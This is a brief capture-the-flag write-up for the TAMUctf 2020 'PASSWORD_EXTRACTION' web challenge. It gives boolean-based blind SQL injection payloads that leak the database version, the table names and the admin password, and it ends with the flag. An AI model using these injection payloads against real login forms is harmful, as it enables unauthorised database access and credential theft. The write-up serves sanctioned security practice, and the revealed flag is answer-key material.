# PASSWORD_EXTRACTION Writeup

### TAMUctf 2020 - Web 50

> The owner of this website often reuses passwords. Can you find out the password they are using on this test server?
>
> http://passwordextraction.tamuctf.com
>
> You do not need to use brute force for this challenge.

#### Blind SQL Injection

Goal: leak admin password.

First I leaked mysql version:

- ID: `admin' and ascii(substring(version(), {}, 1)){}{} #`

```
5.7.29-0ubuntu0.18.04.1
```

Next leak table names:

- ID: `admin' and ascii(substring((select group_concat(table_name) from information_schema.tables limit 0, 1), {}, 1)){}{} #`
- User defined tables:

```
accounts,columns_pr
```

Finally leak password of admin:

- ID: `admin' and ascii(substring((select password from accounts where username='admin'), {}, 1)){}{} #`
- Get flag:

```
gigem{h0peYouScr1ptedTh1s}
```